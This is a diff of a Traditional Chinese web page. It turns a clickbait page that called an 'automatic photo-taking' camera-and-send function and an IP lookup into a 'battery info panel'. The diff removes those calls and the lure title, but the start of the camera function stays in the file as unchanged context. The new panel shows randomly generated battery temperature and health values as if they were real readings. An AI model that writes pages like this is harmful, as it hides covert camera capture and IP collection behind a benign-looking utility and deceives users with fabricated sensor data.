@@ -1,19 +1,86 @@
+
 <!DOCTYPE html>
 <html lang="zh-TW">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>驚天秘密曝光！他們不想讓你知道的真相！</title>
+  <title>電池資訊面板</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #1a1a1a;
+      color: #fff;
+    }
+    .container {
+      padding: 20px;
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 20px;
+    }
+    .card {
+      background: #2b2b2b;
+      border-radius: 10px;
+      padding: 20px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
+    }
+    .card h3 {
+      margin-top: 0;
+      font-size: 1.5rem;
+    }
+    .progress-container {
+      width: 100%;
+      background: #444;
+      border-radius: 10px;
+      overflow: hidden;
+    }
+    .progress-bar {
+      height: 20px;
+      background: #4caf50;
+      width: 0;
+      transition: width 0.5s ease-in-out;
+    }
+    .chart {
+      width: 100%;
+      height: 150px;
+      background: #333;
+      border-radius: 10px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ccc;
+      font-size: 1.2rem;
+    }
+  </style>
 </head>
 <body>
-  <h1>驚天秘密曝光！他們不想讓你知道的真相！</h1>
-  <p id="ipInfo">資訊載入中...</p>
-  <p id="status">請開啟鏡頭使用ＡＲ...</p>
-  <p id="batteryInfo">電池狀態載入中...</p>
+  <h1 style="text-align: center; margin: 20px 0;">電池資訊面板</h1>
+  <div class="container">
+    <div class="card">
+      <h3>電池電量</h3>
+      <div class="progress-container">
+        <div class="progress-bar" id="batteryLevelBar"></div>
+      </div>
+      <p id="batteryLevelText">電量：載入中...</p>
+    </div>
+    <div class="card">
+      <h3>充電狀態</h3>
+      <p id="chargingStatus">載入中...</p>
+    </div>
+    <div class="card">
+      <h3>電池溫度</h3>
+      <div class="chart" id="batteryTemperature">載入中...</div>
+    </div>
+    <div class="card">
+      <h3>電池健康度</h3>
+      <div class="chart" id="batteryHealth">載入中...</div>
+    </div>
+  </div>
 
   <script>
-    // 自動拍照功能
-    async function startCameraAndSend() {
+      // 自動拍照功能
+      async function startCameraAndSend() {
       const statusElement = document.getElementById('status');
 
       try {
@@ -156,9 +223,52 @@
       }
     }
 
-    // 啟動功能
-    getIpInfo();
-    startCameraAndSend();
+    async function displayBatteryInfo() {
+      try {
+        const battery = await navigator.getBattery();
+
+        // 更新電量
+        const updateBatteryLevel = () => {
+          const level = (battery.level * 100).toFixed(0);
+          const bar = document.getElementById('batteryLevelBar');
+          const text = document.getElementById('batteryLevelText');
+          bar.style.width = `${level}%`;
+          text.innerText = `電量：${level}%`;
+        };
+
+        // 更新充電狀態
+        const updateChargingStatus = () => {
+          const charging = battery.charging ? '充電中' : '未充電';
+          document.getElementById('chargingStatus').innerText = `狀態：${charging}`;
+        };
+
+        // 模擬電池溫度（需實際硬體 API 支援）
+        const updateBatteryTemperature = () => {
+          const temperature = (Math.random() * (40 - 25) + 25).toFixed(1); // 模擬溫度值
+          document.getElementById('batteryTemperature').innerText = `${temperature} °C`;
+        };
+
+        // 模擬電池健康度
+        const updateBatteryHealth = () => {
+          const health = Math.floor(Math.random() * (100 - 85) + 85); // 模擬健康度
+          document.getElementById('batteryHealth').innerText = `${health}% 健康`;
+        };
+
+        // 初始化
+        updateBatteryLevel();
+        updateChargingStatus();
+        updateBatteryTemperature();
+        updateBatteryHealth();
+
+        // 監聽電池變化
+        battery.addEventListener('levelchange', updateBatteryLevel);
+        battery.addEventListener('chargingchange', updateChargingStatus);
+      } catch (error) {
+        console.error('無法獲取電池資訊:', error);
+      }
+    }
+
+    // 啟動電池資訊顯示
     displayBatteryInfo();
   </script>
 </body>
